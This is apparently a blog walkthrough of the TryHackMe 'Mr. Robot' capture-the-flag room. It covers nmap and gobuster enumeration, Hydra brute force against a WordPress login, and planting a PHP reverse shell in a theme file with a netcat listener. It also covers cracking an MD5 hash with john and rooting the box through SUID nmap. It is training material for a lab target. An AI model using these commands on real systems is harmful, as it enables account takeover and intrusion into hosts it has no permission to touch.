---
title: 'TryHackMe: Mr. Robot'
author: Dustin Merritt
categories: [TryHackMe]
tags: [web-exploitation, enumeration, bruteforce, wordpress, hydra, reverse-shell, privilege-escalation, nmap, john, suid, linux]
render_with_liquid: false
media_subpath: /images/tryhackme_mrrobot/
image:
  path: room_image.webp
---

# Mr Robot CTF Walkthrough

This room was a fun dive into realistic enumeration and privilege escalation techniques. Below is how I approached and completed the Mr. Robot CTF on TryHackMe, with step-by-step explanations that anyone new to this can follow.

![Tryhackme Room Link](room_card.webp){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/mrrobot>_

# Initial Enumeration

## Port Scan

Use `nmap` to identify open ports and running services. Service/Version enumeration(`-sV`) and default scripts (`-sC`) quickly tell you what services exist and their versions, which directs your net steps (e.g., web app testing vs SSH bruteforce). Output files (`-oA)` let you review later without re-scanning.

```bash
nmap -sC -sV -oA nmap_scan <target_IP>
```

```jsx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 10:11 EDT
Nmap scan report for 
Host is up (0.29s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e1:a6:33:ae:af:ed:ac:b8:e0:24:dc:b7:f7:f4:d0:62 (RSA)
|   256 a5:ce:f9:e1:b4:68:f9:0e:4a:f2:a5:0b:8c:8b:04:d7 (ECDSA)
|_  256 32:60:d5:67:3a:47:d5:fb:6b:ff:57:f1:a3:8d:9a:ef (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.50 seconds
```

I found ports 80 (HTTP) and 443 (HTTPS) open, indicating a web server was running. This meant the first part of the box would likely be web-focused.

## Website Recon

Visit the target website. Inspect the page visually and view the source code. Developers often leave comments or hints that aren’t visible in the rendered page.

![image.png](image.png)

### Check `robots.txt`

Go to `http://<TARGET_IP>/robots.txt`. This file tells search engines what not to index, but attackers read it to discover hidden directories or files. 

![image.png](image%201.png)

In this case, it reveals `fsocity.dic` (a password wordlist) and `key-1-of-3.txt`(first flag). 

I downloaded both using `curl`:

```bash
curl http://<target_ip>/fsocity.dic -o fsocity.dic
curl http://<target_ip>/key-1-of-3.txt
```

## Web Enumeration / Directory Bruteforce

I used `gobuster` to search for hidden directories and found `/wp-login.php`, revealing that the site was running WordPress.

```bash
gobuster dir -u http://<target_IP> -w /usr/share/wordlists/dirb/common.txt -t 100 -q -o gobuster_mrrobot.txt

```

![image.png](image%202.png)

Directory brute force uncovers hidden paths such as /wp-login.php, which indicates WordPress.

### Identify CMS / login paths

Visit /wp-login.php. Since it’s WordPress, suspect weak credentials or misconfigurations.

### Capture a login POST (Burp)

Enable Burp proxy and attempt a login with dummy credentials. Not parameter names (`log`, `pwd`) and failure strings (e.g., “Invalid username”). These are required for Hydra.

### Username enumeration with Hydra

If login errors differ between bad usernames and bad passwords, you can enumerate valid usernames:

```bash
hydra -L /path/to/fsocity.dic -p somepass <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"

```

> The password list `fsocity.dic` has `858160` entries gathered with the command `wc -l fsociety.dic`. I thought this would take awhile so I checked if there were duplicates `sort fsocity.dic | uniq -d | wx -l` which the output was `11441`. Cleaning up the list using `sort -u fsocity.dic -o cleaned_fsocity.dic` would create a shorter listed, removing duplicates, and speeding up the follwoing.
> 

With a valid username (e.g., Elliot), brute force the password.

```bash
hydra -l Elliot -P fsocity.dic <TARGET_IP> http-post-form "/wp-login.php:log=Elliot&pwd=^PASS^:The password you entered for the username Elliot is incorrect" -t 4
```

This should reveal the correct password.

![image.png](image%203.png)

### Log into WordPress

Check the user’s permissions. Editor or Admin access allows theme file editing, which can be leveraged for code execution.

![image.png](image%204.png)

After logging in as Elliot, I edited the `archive.php` template under Appearance > Editor and inserted a reverse shell from .

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![image.png](image%205.png)

Make sure to change the `$ip` and `$port` .

![image.png](image%206.png)

### Prepare Listener

On your machine:

```bash
rlwrap nc -lvnp 1234
```

### Obtain PHP Reverse Shell

Download a reverse shell script (e.g. PentestMonkey’s). Set your IP (RHOST) and port (RPORT) to match your listener.

Inject PHP reverse shell via WordPress

Edit a theme file such as `archive.php` in the WordPress editor. Insert the PHP reverse shell and save.

Trigger reverse shell

Visit the modified page, e.g.: `http://<TARGET_IP>/wp-content/themes/2015/archive.php`

![image.png](image%207.png)

The netcat listener should catch a shell. Run `whoami` to confirm.

Post-exploit enumeration

List users and readable files:

```bash
ls /home
ls -la /home/robot
cat /home/robot/password.raw-md5
```

![image.png](image%208.png)

Copy any hashes you find.

Crack hashes with John

Save the hash to `md5.hash` and run:

```bash
john --wordlist=fsocity.dic --format=raw-md5 md5.hash
john --show md5.hash
```

This reveals the `robot` user’s password.

### Upgrade to the `robot` User

Upgrade shell to interactive TTY

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image.png](image%209.png)

This makes `su` and other commands work properly.

Switch user to `robot`

```bash
su robot
```

Enter the cracked password. Confirm with `whoami` and read the second flag in `/home/robot`.

### Escalate to `root` User

Search for SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

![image.png](image%2010.png)

Look for misconfigured binaries.

Exploit SUID `nmap`

[https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/)

If `nmap` has SUID bit set, run:

```bash
nmap --interactive
```

At the prompt, type:

```
!sh
```

This spawns a root shell.

Confirm root and capture final flag.

```bash
whoami
ls /root
cat /root/key-3-of-3.txt
```

![image.png](image%2011.png)

---

<style>
.center img {
  display: block;
  margin-left: auto;
  margin-right: auto;
}
.wrap pre {
  white-space: pre-wrap;
}
</style>